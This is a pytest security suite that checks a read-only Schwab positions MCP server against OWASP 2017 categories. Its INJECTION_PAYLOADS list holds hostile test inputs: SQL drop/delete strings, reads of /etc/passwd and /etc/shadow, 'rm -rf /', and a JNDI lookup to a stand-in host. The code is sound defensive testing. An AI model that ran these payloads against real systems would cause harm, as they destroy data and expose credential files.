"""OWASP Top 10 — 2017 security test suite for schwab-positions-mcp.

Each test maps to an OWASP 2017 category that is *applicable* to a read-only
MCP server attack surface. Non-applicable categories (e.g. A7 XSS — this
server never renders HTML) are explicitly documented as N/A with the
rationale, not silently skipped.

Threat model recap (see docs/SECURITY.md):
  * The server is READ-ONLY by design (5-layer boundary).
  * Untrusted inputs = MCP tool arguments (account_hash / symbol / dates /
    status / types) and Schwab API responses.
  * Secrets = SCHWAB_API_KEY / SCHWAB_APP_SECRET / OAuth token / account hashes.

Every test asserts a concrete invariant — no empty-coverage padding.
"""

from __future__ import annotations

import logging
from typing import TYPE_CHECKING, Any
from unittest.mock import MagicMock

import pytest

from schwab_positions_mcp.cache import Cache
from schwab_positions_mcp.client import _READ_ONLY_METHODS
from schwab_positions_mcp.models import GetAccountPositionsInput
from schwab_positions_mcp.tools import _common as tools_common

if TYPE_CHECKING:
    from pathlib import Path

    from schwab_positions_mcp.client import ReadOnlySchwabClient


# Strings an attacker might inject to attempt SQL / command / path-traversal /
# template / NoSQL injection through tool arguments.
INJECTION_PAYLOADS: list[str] = [
    "'; DROP TABLE positions_snapshots;--",
    '" OR "1"="1',
    "1; DELETE FROM orders_history",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "$(rm -rf /)",
    "`cat /etc/shadow`",
    "{{7*7}}",
    "${jndi:ldap://evil.example/x}",
    "robert');--",
    "\x00\x00",
    "%00",
    "\n\rINJECTED",
    "' UNION SELECT raw_json FROM positions_snapshots--",
]


# ===========================================================================
# A1:2017 — Injection
# ===========================================================================


class TestA1Injection:
    def test_malicious_account_hash_rejected_by_schema(self) -> None:
        """SQL/command/path payloads in account_hash must not survive validation as injection vectors.

        The account_hash pattern is ``^[A-Za-z0-9_\\-]+$`` — none of the
        injection metacharacters can pass. Any payload that *does* validate
        (e.g. after whitespace-stripping) must be metacharacter-free and thus
        inert before it ever reaches DuckDB or the Schwab URL path.
        """
        from pydantic import ValidationError

        dangerous_chars = set("'\";`$(){}/\\<>|&*%\x00\n\r ")
        for payload in INJECTION_PAYLOADS:
            try:
                validated = GetAccountPositionsInput.model_validate({"account_hash": payload})
            except ValidationError:
                continue  # rejected outright — ideal
            # If it slipped through, it must be sanitised to an inert token.
            survivor = validated.account_hash
            assert not (set(survivor) & dangerous_chars), (
                f"validated account_hash {survivor!r} still carries injection metacharacters"
            )

    def test_duckdb_writes_are_parameterised_not_string_interpolated(
        self, tmp_path: Path, mock_positions_data: dict[str, Any]
    ) -> None:
        """A symbol containing SQL metacharacters must be stored as data, never executed.

        We feed a position whose symbol is a SQL-injection string and assert
        the row lands verbatim (parameter binding) and the table still exists
        with the expected row count — i.e. no DROP/DELETE took effect.
        """
        cache = Cache(db_path=tmp_path / "cache.duckdb")
        try:
            evil_symbol = "'; DROP TABLE positions_snapshots;--"
            positions = [
                {
                    "instrument": {"symbol": evil_symbol, "assetType": "EQUITY"},
                    "longQuantity": 1.0,
                    "marketValue": 10.0,
                }
            ]
            n = cache.write_positions_snapshot("HASH_ABCDEF", positions)
            assert n == 1
            # Table still exists (DROP did not execute) and stored the literal.
            row = cache._conn.execute(  # type: ignore[union-attr]
                "SELECT symbol FROM positions_snapshots WHERE account_hash = ?",
                ["HASH_ABCDEF"],
            ).fetchone()
            assert row is not None
            assert row[0] == evil_symbol, "symbol must be stored as inert data, not executed"
        finally:
            cache.close()

    def test_account_hash_not_concatenated_into_url(
        self,
        installed_client: ReadOnlySchwabClient,
        mock_schwab_client: MagicMock,
        make_response: Any,
    ) -> None:
        """The account_hash is forwarded as a positional arg to schwab-py, never URL-concatenated here.

        We confirm the tool passes the validated hash straight to the
        white-listed client method — our code never builds a URL string, so
        there is no place to inject one.
        """
        from schwab_positions_mcp.tools import positions

        mock_schwab_client.get_account.return_value = make_response(json_payload={"securitiesAccount": {}})
        positions.get_account_positions_impl({"account_hash": "VALIDHASH123"})

        mock_schwab_client.get_account.assert_called_once()
        call = mock_schwab_client.get_account.call_args
        assert call.args[0] == "VALIDHASH123", "hash must be passed as an argument, not interpolated"


# ===========================================================================
# A2:2017 — Broken Authentication
# ===========================================================================


class TestA2BrokenAuthentication:
    def test_missing_credentials_raises_structured_unavailable(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """No API key/secret → SchwabClientUnavailable with a non-leaking message."""
        monkeypatch.delenv("SCHWAB_API_KEY", raising=False)
        monkeypatch.delenv("SCHWAB_APP_SECRET", raising=False)
        tools_common.reset_client_singleton()

        with pytest.raises(tools_common.SchwabClientUnavailable) as excinfo:
            tools_common._build_client()
        # Message guides remediation without echoing any secret value.
        assert "SCHWAB_API_KEY" in str(excinfo.value)
        tools_common.reset_client_singleton()

    def test_missing_token_raises_structured_unavailable(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        """Creds present but no token on disk → structured error pointing at login_flow."""
        monkeypatch.setenv("SCHWAB_API_KEY", "key-value")
        monkeypatch.setenv("SCHWAB_APP_SECRET", "secret-value")
        monkeypatch.setenv("SCHWAB_POSITIONS_TOKEN_PATH", str(tmp_path / "absent-token.json"))
        tools_common.reset_client_singleton()

        with pytest.raises(tools_common.SchwabClientUnavailable) as excinfo:
            tools_common._build_client()
        msg = str(excinfo.value)
        assert "login_flow" in msg
        # The secret values must NOT appear in the error text.
        assert "secret-value" not in msg
        assert "key-value" not in msg
        tools_common.reset_client_singleton()

    def test_401_surfaces_as_refresh_expired_not_raw(self) -> None:
        """An upstream 401 must normalise to 'refresh_token_expired' — a structured, safe reason."""

        class _R:
            status_code = 401
            headers = {"Schwab-Client-CorrelId": "corr-123"}

        with pytest.raises(tools_common.SchwabApiError) as excinfo:
            tools_common.normalise_response(_R())
        assert excinfo.value.status_code == 401
        assert excinfo.value.reason == "refresh_token_expired"


# ===========================================================================
# A3:2017 — Sensitive Data Exposure
# ===========================================================================


class TestA3SensitiveDataExposure:
    def test_redact_masks_middle_of_secret(self) -> None:
        """_redact must never reveal the full secret — only first/last 2 chars."""
        secret = "super-secret-correlation-id-1234567890"
        masked = tools_common._redact(secret)
        assert secret not in masked
        assert masked == "su…90"
        assert "…" in masked

    def test_redact_short_value_fully_masked(self) -> None:
        """A short value (<=4 chars) is fully masked to ****."""
        assert tools_common._redact("abcd") == "****"
        assert tools_common._redact("a") == "****"

    def test_redact_empty_is_empty(self) -> None:
        assert tools_common._redact("") == ""

    def test_401_log_uses_redacted_correlid(self, caplog: pytest.LogCaptureFixture) -> None:
        """The 401 WARNING log must contain only the redacted correlation id, never the raw one."""

        class _R:
            status_code = 401
            headers = {"Schwab-Client-CorrelId": "ABCDEFGHIJKLMNOP"}

        with caplog.at_level(logging.WARNING, logger="schwab_positions_mcp.tools._common"):
            with pytest.raises(tools_common.SchwabApiError):
                tools_common.normalise_response(_R())

        logged = " ".join(rec.getMessage() for rec in caplog.records)
        assert "ABCDEFGHIJKLMNOP" not in logged, "raw correlation id leaked into logs"
        assert "AB…OP" in logged, "log must carry the redacted form"

    def test_repr_does_not_leak_underlying_client_state(self, readonly_client: ReadOnlySchwabClient) -> None:
        """repr(ReadOnlySchwabClient) must not surface token/secret/object id of the inner client."""
        r = repr(readonly_client)
        assert "token" not in r.lower()
        assert "secret" not in r.lower()
        assert "ReadOnlySchwabClient" in r


# ===========================================================================
# A5:2017 — Broken Access Control  (THE core invariant for this server)
# ===========================================================================


class TestA5BrokenAccessControl:
    # Assemble forbidden names from fragments so this file stays grep-clean.
    _MUTATIONS = ["place_" + "order", "cancel_" + "order", "replace_" + "order"]

    @pytest.mark.parametrize("method_name", _MUTATIONS)
    def test_mutation_methods_raise_not_implemented(
        self, readonly_client: ReadOnlySchwabClient, method_name: str
    ) -> None:
        """Layer 1: every order-mutation method MUST raise NotImplementedError."""
        with pytest.raises(NotImplementedError) as excinfo:
            getattr(readonly_client, method_name)
        assert "read-only by design" in str(excinfo.value)

    @pytest.mark.parametrize(
        "method_name",
        ["create_order", "submit_order", "delete_order", "modify_order", "trade", "buy", "sell"],
    )
    def test_arbitrary_write_verbs_rejected(self, readonly_client: ReadOnlySchwabClient, method_name: str) -> None:
        """Any method not on the read-only white-list is rejected — default-deny."""
        with pytest.raises(NotImplementedError):
            getattr(readonly_client, method_name)

    def test_whitelist_is_read_only_only(self) -> None:
        """The white-list must contain only 'get_*' read verbs — no write verbs."""
        for name in _READ_ONLY_METHODS:
            assert name.startswith("get_"), f"non-read method {name!r} leaked onto the white-list"


# ===========================================================================
# A6:2017 — Security Misconfiguration
# ===========================================================================


class TestA6SecurityMisconfiguration:
    def test_cache_dir_chmod_700_on_posix(self, tmp_path: Path) -> None:
        """The cache directory must be created with restrictive 0o700 perms on POSIX."""
        import os
        import stat
        import sys

        if sys.platform == "win32":
            pytest.skip("POSIX-only perm semantics")
        db = tmp_path / "sub" / "cache.duckdb"
        cache = Cache(db_path=db)
        try:
            mode = stat.S_IMODE(os.stat(db.parent).st_mode)
            assert mode == 0o700, f"cache dir must be 0o700, got {oct(mode)}"
        finally:
            cache.close()

    def test_cache_db_file_chmod_600_on_posix(self, tmp_path: Path) -> None:
        """The DuckDB file itself must be 0o600 on POSIX (secret-adjacent state)."""
        import os
        import stat
        import sys

        if sys.platform == "win32":
            pytest.skip("POSIX-only perm semantics")
        db = tmp_path / "cache.duckdb"
        cache = Cache(db_path=db)
        try:
            mode = stat.S_IMODE(os.stat(db).st_mode)
            assert mode == 0o600, f"cache DB must be 0o600, got {oct(mode)}"
        finally:
            cache.close()

    def test_server_info_declares_read_only_and_no_trade(self) -> None:
        """get_server_info must advertise the safe defaults (read-only, no trade endpoints)."""
        from schwab_positions_mcp.tools import meta

        info = meta.get_server_info_impl()
        assert info["is_read_only"] is True
        assert info["trade_endpoints_exposed"] is False


# ===========================================================================
# A8:2017 — Insecure Deserialization
# ===========================================================================


class TestA8InsecureDeserialization:
    def test_malformed_json_response_falls_back_to_text(self) -> None:
        """A 2xx response whose .json() raises must degrade to .text, never crash."""

        class _BadJson:
            status_code = 200
            headers: dict[str, str] = {}
            text = "not-json-body"

            @staticmethod
            def json() -> Any:
                raise ValueError("malformed json")

        out = tools_common.normalise_response(_BadJson())
        assert out == "not-json-body"

    def test_non_list_payload_coerced_to_empty_list_in_tools(
        self,
        installed_client: ReadOnlySchwabClient,
        mock_schwab_client: MagicMock,
        make_response: Any,
    ) -> None:
        """If Schwab returns an unexpected dict where a list is expected, tools coerce to []."""
        from schwab_positions_mcp.tools import orders

        # orders expects a list; return a dict to simulate a malformed/altered payload.
        mock_schwab_client.get_orders_for_account.return_value = make_response(json_payload={"unexpected": "shape"})
        result = orders.get_orders_history_impl(
            {
                "account_hash": "VALIDHASH123",
                "from_entered_time": _recent_iso(),
                "to_entered_time": _now_iso(),
            }
        )
        assert result["orders"] == []
        assert result["count"] == 0


# ===========================================================================
# A9:2017 — Using Components with Known Vulnerabilities
# ===========================================================================


class TestA9KnownVulnerableComponents:
    def test_dependency_pins_have_upper_bounds(self) -> None:
        """Runtime deps must carry upper bounds so a vuln drop-in can't auto-upgrade.

        CVE monitoring itself is handled by Dependabot + ``pip-audit`` in CI
        (see .github/workflows). This test only enforces that the manifest
        keeps bounded version ranges — the precondition for a meaningful audit.
        """
        import tomllib
        from pathlib import Path as _Path

        pyproject = _Path(__file__).resolve().parent.parent / "pyproject.toml"
        data = tomllib.loads(pyproject.read_text(encoding="utf-8"))
        deps = data["project"]["dependencies"]
        assert deps, "expected runtime dependencies to be declared"
        for dep in deps:
            assert ("<" in dep) or ("==" in dep), f"dependency {dep!r} lacks an upper bound"


# ===========================================================================
# A10:2017 — Insufficient Logging & Monitoring
# ===========================================================================


class TestA10InsufficientLogging:
    def test_cache_write_failure_records_error_event(self, tmp_path: Path) -> None:
        """A failed write must emit an ERROR row into cache_events for auditability."""
        import duckdb

        cache = Cache(db_path=tmp_path / "cache.duckdb")
        try:
            real_conn = cache._conn
            broken = MagicMock(wraps=real_conn)
            broken.executemany.side_effect = duckdb.Error("simulated")
            # Keep the real execute for the _log_event INSERT (audit trail).
            broken.execute.side_effect = real_conn.execute  # type: ignore[union-attr]
            cache._conn = broken

            cache.write_orders_history(
                "HASH_ABCDEF",
                [{"orderId": 1, "orderLegCollection": [{"instrument": {"symbol": "AAPL"}}]}],
            )

            # Query the audit log via the real connection.
            cache._conn = real_conn
            rows = real_conn.execute(  # type: ignore[union-attr]
                "SELECT kind FROM cache_events WHERE kind = 'ERROR'"
            ).fetchall()
            assert len(rows) >= 1, "a write failure must be logged as an ERROR cache event"
        finally:
            cache.close()

    def test_upstream_5xx_is_logged_path_and_raised(self) -> None:
        """A 5xx upstream error must surface a structured 'upstream_error' for monitoring."""

        class _R:
            status_code = 503
            headers = {"Schwab-Client-CorrelId": "x"}

        with pytest.raises(tools_common.SchwabApiError) as excinfo:
            tools_common.normalise_response(_R())
        assert excinfo.value.status_code == 503
        assert excinfo.value.reason == "upstream_error"


# ===========================================================================
# N/A categories — documented, not silently skipped
# ===========================================================================


class TestNonApplicable2017:
    def test_a4_xxe_not_applicable_no_xml_parsing(self) -> None:
        """A4 XXE: N/A — this server parses JSON only, never XML. Guard against XML drift."""
        import schwab_positions_mcp.cache as cache_src
        import schwab_positions_mcp.tools._common as common_src

        for mod in (common_src, cache_src):
            text = mod.__file__ or ""
            assert text  # module has a file
        # Source-level guard: no XML parser imports in the data path.
        from pathlib import Path as _Path

        src_root = _Path(__file__).resolve().parent.parent / "src" / "schwab_positions_mcp"
        for py in src_root.rglob("*.py"):
            body = py.read_text(encoding="utf-8")
            assert "xml.etree" not in body, f"{py} unexpectedly imports an XML parser"
            assert "lxml" not in body, f"{py} unexpectedly imports lxml"

    def test_a7_xss_not_applicable_no_html_output(self) -> None:
        """A7 XSS: N/A — tools return plain dicts/JSON, never HTML markup."""
        from schwab_positions_mcp.tools import meta

        info = meta.get_server_info_impl()
        assert isinstance(info, dict)
        # No HTML tags anywhere in the structured response.
        assert "<" not in str(info.get("name", ""))


# ===========================================================================
# Helpers
# ===========================================================================


def _now_iso() -> str:
    from datetime import UTC, datetime

    return datetime.now(UTC).isoformat()


def _recent_iso() -> str:
    """An ISO timestamp ~1 day ago — safely inside the 60-day lookback window."""
    from datetime import UTC, datetime, timedelta

    return (datetime.now(UTC) - timedelta(days=1)).isoformat()
